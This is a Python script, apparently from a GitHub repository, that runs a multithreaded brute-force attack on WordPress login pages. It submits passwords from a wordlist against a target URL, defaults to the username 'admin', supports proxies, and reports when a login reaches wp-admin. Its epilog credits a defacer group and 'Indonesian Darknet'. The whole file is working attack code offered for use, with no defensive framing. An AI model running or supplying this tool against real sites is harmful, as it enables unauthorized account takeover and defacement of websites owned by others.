#!/usr/bin/env python3
"""
GitHub: https://github.com/Sai-poornesh04/wL-brute-force-tool
Contact: saipoornesh44kavili@gmail.com
"""

import os
import re
import time
import random
import logging
import urllib.parse
import urllib.request
import http.cookiejar
import concurrent.futures

from pathlib import Path
from datetime import datetime
from argparse import FileType
from argparse import SUPPRESS
from argparse import ArgumentParser

# Global constants
NAME = "wL Brute Force Tool"
VERSION = "1.0.1"
LOGGERNAME = Path(__file__).stem

# Logging configuration
logging.basicConfig(format="[%(asctime)s][%(levelname)s] %(message)s", datefmt="%H:%M:%S")
log = logging.getLogger(LOGGERNAME)
log.setLevel(logging.INFO)

# Custom logging levels
logging.addLevelName(60, "SUCCESS")
def success(self, message, *args, **kws):
    if self.isEnabledFor(60):
        self._log(60, message, args, **kws) 
logging.Logger.success = success

logging.addLevelName(70, "FAILED")
def failed(self, message, *args, **kws):
    if self.isEnabledFor(70):
        self._log(70, message, args, **kws) 
logging.Logger.failed = failed

# User agents for HTTP requests
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
    # Add more user agents as needed
]

# Banner message
BANNER = f"""\
██╗   ██╗███╗   ██╗███████╗ █████╗ ██████╗  ██████╗███████╗██████╗ 
██║   ██║████╗  ██║██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗
██║   ██║██╔██╗ ██║█████╗  ███████║██████╔╝██║     █████╗  ██████╔╝
╚██╗ ██╔╝██║╚██╗██║██╔══╝  ██╔══██║██╔══██╗██║     ██╔══╝  ██╔══██╗
 ╚████╔╝ ██║ ╚████║███████╗██║  ██║██████╔╝╚██████╗███████╗██║  ██║
  ╚═══╝  ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝╚══════╝╚═╝  ╚═╝
{NAME}™
"""


# Function to print banner
def print_banner():
    print(BANNER)
    print(f"[*] Starting at {datetime.now().strftime('%H:%M:%S (%d-%m-%Y)')}\n")

# Function to read a list
def read_list(content):
    return [line.strip() for line in content.readlines()]

# Function to start login attempt
def start_login(url, username, password, timeout, user_agent, proxy):
    form = urllib.parse.urlencode({"log": username, "pwd": password}).encode()
    try:
        request = urllib.request.Request(url, data=form, headers={"User-Agent": user_agent})
        if proxy:
            request.set_proxy(proxy, "http")
        with urllib.request.urlopen(request, timeout=timeout) as response:
            if re.search("wp-admin", response.url):
                return password
    except Exception as e:
        raise e

# Main function
def main():
    global log

    # Argument parser
    parser = ArgumentParser(usage="python %(prog)s [options]", epilog="Copyright © 2021 Defacer Hurt.id - Powered by Indonesian Darknet")
    parser.add_argument("-V", "--version", action="version", version=VERSION)
    parser.add_argument("-d", "--debug", action="store_const", const=logging.DEBUG, help="Debugging mode")
    target = parser.add_argument_group("Target arguments")
    target.add_argument("-t", "--target", metavar="", help="URL of the target", required=True)
    target.add_argument("-u", "--username", metavar="", default="admin", help="Username of the target (default: admin)")
    target.add_argument("-p", "--password", metavar="", help="Password of the target (change -p to --p to use a wordlist)")
    target.add_argument("--p", dest="pwd_list", type=FileType('r'), help=SUPPRESS)
    request = parser.add_argument_group()
    request.add_argument("--timeout", metavar="", type=int, default=5, help="Timed out for requests")
    request.add_argument("--thread", metavar="", type=int, default=5, help="Number of threading multiprocessor (default: 5)")
    request.add_argument("--proxy", metavar="", help="Using an HTTP proxy (e.g., http://site.com:8000)")
    args = parser.parse_args()

    # Print banner
    print_banner()

    # Set log level
    if args.debug:
        log.setLevel(args.debug)

    proxy = args.proxy if args.proxy else ""
    password = [args.password] if args.password else read_list(args.pwd_list)
    timeout = args.timeout
    user_agent = random.choice(USER_AGENTS)

    try:
        # Test connection to the target
        log.info("Testing connection to the target")
        response = urllib.request.urlopen(args.target, timeout=timeout)
    except Exception as e:
        raise e

    log.info(f'Using "{args.username}" as the username')
    logged = False
    start_time = time.time()

    log.info("Starting a login brute force")
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.thread) as executor:
        processed = (executor.submit(start_login, response.url, args.username, pwd, timeout, user_agent, proxy) for pwd in password)
        for i, process in enumerate(concurrent.futures.as_completed(processed)):
            if len(password) > 1:
                print(f"[{datetime.now().strftime('%H:%M:%S')}] [INFO] Testing {i} password", end="\r")
            process = process.result()
            if process:
                logged = True
                password = process
                break

    if logged:
        log.success(f'Successfully logged in to the target dashboard with username "{args.username}" and password "{password}"')
    else:
        log.failed("Failed to log in to the target dashboard")
    log.info(f'Time taken: {int(time.time() - start_time)} seconds')

if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        log.critical(e)
